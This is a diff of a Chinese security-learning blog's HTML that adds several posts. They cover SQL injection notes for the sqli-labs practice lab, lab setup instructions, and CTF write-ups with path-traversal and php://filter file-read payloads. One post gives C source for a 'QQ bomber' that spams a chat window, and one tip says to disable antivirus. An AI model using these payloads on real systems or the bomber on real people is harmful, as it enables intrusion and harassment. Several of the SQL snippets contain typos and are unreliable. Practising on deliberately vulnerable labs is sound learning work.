@@ -313,7 +313,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">266字</span>
+        <span class="post-count">265字</span>
       </span>
     </span>
 
@@ -335,7 +335,29 @@
     <div class="article-entry" itemprop="articleBody">
       
         
-          		<h1 id="sqlilabs"><a href="#sqlilabs" class="headerlink" title="sqlilabs"></a>sqlilabs</h1>
+          
+            <a id="more"></a>
+<h1 id="sqlilabs"><a href="#sqlilabs" class="headerlink" title="sqlilabs"></a>sqlilabs</h1><h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1e441127Rd?from=search&seid=18004264285550760559">https://www.bilibili.com/video/BV1e441127Rd?from=search&amp;seid=18004264285550760559</a>.</p>
+<h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata            &#x2F;&#x2F;查库</span><br><span class="line">select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;    &#x2F;&#x2F; 查表</span><br><span class="line">select column_name form information_schema.column.columns where table_name&#x3D;&#39;users&#39;     &#x2F;&#x2F;查列</span><br><span class="line">select username,password from security.users               &#x2F;&#x2F;查字段</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A and B      ：  A 和B 均成立才可执行</span><br><span class="line">A or B        ： A 和 B 其中一个成立即可执行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limint 0,1    : 表示</span><br></pre></td></tr></table></figure>
+
+<p>–+ 和–空格  是注释符</p>
+<p>例如id=1’–+(id=1’– )<br><img src="/.io//"></p>
+<p>order by “数字”<br>例如：<br>order by 1 表示对第一列排序<br>order by 2 表示对第二列排序<br>order by 10 出现错误，表示这个数据不存在第十列；</p>
+<p>less-01<br>数据存在3列；</p>
+<p>union select 1,2,3–+</p>
+<p>mysql 命令行中：select * from users order by 1;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select database();     </span><br><span class="line">select version();      </span><br><span class="line">select @@database;     </span><br><span class="line">select system_user();  </span><br><span class="line">select current_user();</span><br><span class="line">select @@datadir;</span><br><span class="line">select @@version_compile_os</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat()       &#x2F;&#x2F;将所有数据拼接并显示</span><br></pre></td></tr></table></figure>
+<p><img src="/.io//"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(&#39;~&#39;,username,password)   &#x2F;&#x2F;显示结果为   username~password;</span><br></pre></td></tr></table></figure>
+<p><img src="/.io//"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concay(concat_ws(&#39;~&#39;,username,password))</span><br></pre></td></tr></table></figure>
+<p><img src="/.io//"></p>
+<p>单引号会出现问题 可以将单引号及其内的字符转为16进制</p>
+<h2 id="less-01"><a href="#less-01" class="headerlink" title="less-01"></a>less-01</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1</span><br></pre></td></tr></table></figure>
           
         
 <!---->
@@ -426,7 +448,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">93字</span>
+        <span class="post-count">92字</span>
       </span>
     </span>
 
@@ -448,7 +470,11 @@
     <div class="article-entry" itemprop="articleBody">
       
         
-          		<h1 id="QQ轰炸器"><a href="#QQ轰炸器" class="headerlink" title="QQ轰炸器"></a>QQ轰炸器</h1>
+          
+            <a id="more"></a>
+<h1 id="QQ轰炸器"><a href="#QQ轰炸器" class="headerlink" title="QQ轰炸器"></a>QQ轰炸器</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	int i;</span><br><span class="line">	char name[100];</span><br><span class="line">	printf(&quot;目标：&quot;);</span><br><span class="line">	scanf(&quot;%s&quot;,&amp;name);</span><br><span class="line">	printf(&quot;次数：&quot;);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;i);</span><br><span class="line">	HWND H &#x3D; FindWindow(0,name);	&#x2F;&#x2F;寻找对话框 </span><br><span class="line">	while(i--&gt;0)&#123;</span><br><span class="line">		SendMessage(H,WM_PASTE,0,0);	&#x2F;&#x2F;粘贴 </span><br><span class="line">		SendMessage(H,WM_KEYDOWN,VK_RETURN,0);&#x2F;&#x2F;回车 </span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>使用之前要先复制内容。</p>
+
           
         
 <!---->
@@ -539,7 +565,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">316字</span>
+        <span class="post-count">315字</span>
       </span>
     </span>
 
@@ -561,7 +587,21 @@
     <div class="article-entry" itemprop="articleBody">
       
         
-          		<h1 id="PHPstudy安装sqli-labs及安装错误解决"><a href="#PHPstudy安装sqli-labs及安装错误解决" class="headerlink" title="PHPstudy安装sqli-labs及安装错误解决"></a>PHPstudy安装sqli-labs及安装错误解决</h1>
+          
+            <a id="more"></a>
+<h1 id="PHPstudy安装sqli-labs及安装错误解决"><a href="#PHPstudy安装sqli-labs及安装错误解决" class="headerlink" title="PHPstudy安装sqli-labs及安装错误解决"></a>PHPstudy安装sqli-labs及安装错误解决</h1><h2 id="1-phpstudy安装"><a href="#1-phpstudy安装" class="headerlink" title="1.phpstudy安装"></a>1.phpstudy安装</h2><p><a target="_blank" rel="noopener" href="https://www.xp.cn/">点此安装</a><br>安装之后如下设置<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/y9gkgs"><img src="https://img-blog.csdnimg.cn/img_convert/6541d7135633c2951a049a14f7feb079.png" alt="y9gkgs.md.png"></a></p>
+<h2 id="2-sqli-labs下载"><a href="#2-sqli-labs下载" class="headerlink" title="2.sqli-labs下载"></a>2.sqli-labs下载</h2><p>下载地址<a target="_blank" rel="noopener" href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a>.</p>
+<p>若phpstudy为最新版本，下载地址为<a target="_blank" rel="noopener" href="https://github.com/Rinkish/Sqli_Edited_Version">https://github.com/Rinkish/Sqli_Edited_Version</a>.<br>](<a target="_blank" rel="noopener" href="https://imgchr.com/i/y9gkgs)%E4%B8%8B%E8%BD%BD%E5%8E%8B%E7%BC%A9%E5%8C%85%EF%BC%8C">https://imgchr.com/i/y9gkgs)下载压缩包，</a><br><a target="_blank" rel="noopener" href="https://imgchr.com/i/y9gVuq"><img src="https://img-blog.csdnimg.cn/img_convert/1fd9b379f802f68899c502068886ba0a.png" alt="y9gVuq.md.png"></a><br>然后解压到<code>:\phpstudy\www\</code>目录下</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/y92ps1">[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-xpyha13v-1611831866711)(https://s3.ax1x.com/2021/01/28/y92ps1.md.png)]</a></p>
+<p>将<code>\phpStudy\WWW\sqli-labs\sql-connections</code>下的<code>db-creds.inc</code>红线处中做如此修改：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/y9gC4g">[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-S5GO0BoJ-1611831643285)(https://s3.ax1x.com/2021/01/28/y9gC4g.md.png)]</a><br>然后打开<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/">http://127.0.0.1/sqli-labs/</a>或<a target="_blank" rel="noopener" href="http://127.0.0.1/Sqli_Edited_Version-master/sqlilabs/"></a>就可以了。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/y9giCQ">[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-W48oVvlE-1611831681954)(https://s3.ax1x.com/2021/01/28/y9giCQ.md.png)]</a></p>
+<p>然后点击 Setup/reset Database for labs 出现</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/y9gF3j"><img src="https://img-blog.csdnimg.cn/img_convert/9d0b4c423cc41cf3be1ea351cd022d20.png" alt="y9gF3j.md.png"></a></p>
+<p>点击 SQLi-LABS Page-1(Basic Challenges) 出现</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/y9gAvn">[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-cOBsIv3n-1611831725788)(https://s3.ax1x.com/2021/01/28/y9gAvn.md.png)]</a></p>
+<p>就可以了。</p>
+
           
         
 <!---->
@@ -652,7 +692,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">98字</span>
+        <span class="post-count">97字</span>
       </span>
     </span>
 
@@ -674,7 +714,13 @@
     <div class="article-entry" itemprop="articleBody">
       
         
-          		<h1 id="phpstudy详细安装"><a href="#phpstudy详细安装" class="headerlink" title="phpstudy详细安装"></a>phpstudy详细安装</h1>
+          
+            <a id="more"></a>
+<h1 id="phpstudy详细安装"><a href="#phpstudy详细安装" class="headerlink" title="phpstudy详细安装"></a>phpstudy详细安装</h1><p>首先下载phpstudy Windows版本<br><a target="_blank" rel="noopener" href="https://www.xp.cn/wenda/401.html">下载地址</a>.</p>
+<p>下载之后打开压缩包，<br><img src="https://img-blog.csdnimg.cn/img_convert/44b44562654681027e7920dcd87742de.png" alt="Markdown"></p>
+<p>解压得到<br><img src="https://img-blog.csdnimg.cn/img_convert/ab1b040e8be586c8d99645b5c0b0f532.png" alt="Markdown"></p>
+<p>打开红色框框里面的东西，再打开的时候可能会遭到杀毒软件的拦截，可以把杀毒软件关掉。<br><img src="https://img-blog.csdnimg.cn/img_convert/933877e4afca4f3ed6bb38b153207ed5.png" alt="Markdown"><br>可以自定义安装地址，我这里装在了D盘中<br><img src="https://img-blog.csdnimg.cn/img_convert/71767d22a3409525268c32a2206b5014.png" alt="Markdown"><br>点击安装<br><img src="https://img-blog.csdnimg.cn/img_convert/a6042bb10cb3754eef8f558c74362b34.png" alt="Markdown"><img src="https://img-blog.csdnimg.cn/img_convert/9f36edb8ef56a33144afc22166ff5d7c.png" alt="Markdown">这样就安装成功了。</p>
+
           
         
 <!---->
@@ -787,7 +833,12 @@
     <div class="article-entry" itemprop="articleBody">
       
         
-          		<h1 id="攻防世界进阶Training-WWW-Robots"><a href="#攻防世界进阶Training-WWW-Robots" class="headerlink" title="攻防世界进阶Training-WWW-Robots"></a>攻防世界进阶Training-WWW-Robots</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/1a547ed79ba26e2b35186c189f152c39.png" alt="Markdown"></p>
+          
+            <a id="more"></a>
+<h1 id="攻防世界进阶Training-WWW-Robots"><a href="#攻防世界进阶Training-WWW-Robots" class="headerlink" title="攻防世界进阶Training-WWW-Robots"></a>攻防世界进阶Training-WWW-Robots</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/1a547ed79ba26e2b35186c189f152c39.png" alt="Markdown"></p>
+<p>根据提示用到robots协议<br>打开robots.txt 得到如下</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9e6f1657fce17bef4c7a5c839a2e1201.png" alt="Markdown"><br>根据提示可知flag在/fl0g.php中，那么打开/fl0g.php得到<br><img src="https://img-blog.csdnimg.cn/img_convert/d6932a82c4b84685984223ac4e3a8874.png" alt="Markdown"></p>
+
           
         
 <!---->
@@ -901,7 +952,8 @@
       
         
           
-            <h1 id="攻防世界进阶baby-web"><a href="#攻防世界进阶baby-web" class="headerlink" title="攻防世界进阶baby_web"></a>攻防世界进阶baby_web</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/4545cb0ebfa06b0400afebd7ebfcf346.png" alt="Markdown"><br>题目中的提示是，想象初始页面是哪个<br>因此试试将url中1.php 改为index.php，然后会发现他又自动跳转成了1.php，<br>那么F12改开选择网络，在这里再试试将url中1.php 改为index.php，然后在里面找到flag<br><img src="https://img-blog.csdnimg.cn/img_convert/e395f4687621771f095c2568919941cc.png" alt="Markdown"></p>
+            <a id="more"></a>
+<h1 id="攻防世界进阶baby-web"><a href="#攻防世界进阶baby-web" class="headerlink" title="攻防世界进阶baby_web"></a>攻防世界进阶baby_web</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/4545cb0ebfa06b0400afebd7ebfcf346.png" alt="Markdown"><br>题目中的提示是，想象初始页面是哪个<br>因此试试将url中1.php 改为index.php，然后会发现他又自动跳转成了1.php，<br>那么F12改开选择网络，在这里再试试将url中1.php 改为index.php，然后在里面找到flag<br><img src="https://img-blog.csdnimg.cn/img_convert/e395f4687621771f095c2568919941cc.png" alt="Markdown"></p>
 
           
         
@@ -1016,7 +1068,8 @@
       
         
           
-            <h1 id="SSRF1"><a href="#SSRF1" class="headerlink" title="SSRF1"></a>SSRF1</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/490bb8a70aa162969ad125652460a398.png" alt="Markdown"><br>构造参数<br>【GET】</p>
+            <a id="more"></a>
+<h1 id="SSRF1"><a href="#SSRF1" class="headerlink" title="SSRF1"></a>SSRF1</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/490bb8a70aa162969ad125652460a398.png" alt="Markdown"><br>构造参数<br>【GET】</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dotnet.com../../../../../../../../flag</span><br></pre></td></tr></table></figure>
 <p><img src="https://img-blog.csdnimg.cn/img_convert/c3943ca4f37979ecb3ffe0f59915c5a9.png" alt="Markdown"><br>从而得到flag</p>
 
@@ -1133,7 +1186,8 @@
       
         
           
-            <h1 id="PHP伪协议1"><a href="#PHP伪协议1" class="headerlink" title="PHP伪协议1"></a>PHP伪协议1</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/8e31a74efd72de65cb242a847fd335cf.png" alt="Markdown"></p>
+            <a id="more"></a>
+<h1 id="PHP伪协议1"><a href="#PHP伪协议1" class="headerlink" title="PHP伪协议1"></a>PHP伪协议1</h1><p><img src="https://img-blog.csdnimg.cn/img_convert/8e31a74efd72de65cb242a847fd335cf.png" alt="Markdown"></p>
 <p> 首先用下列代码</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
 <p>解题，得到下面情况。<br><img src="https://img-blog.csdnimg.cn/img_convert/8a3aa6dfd19b74372f87dd2dc2c0d4f3.png" alt="Markdown"><br>这是因为有PHP :<a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-preg_match.html">preg_match()函数</a>.</p>
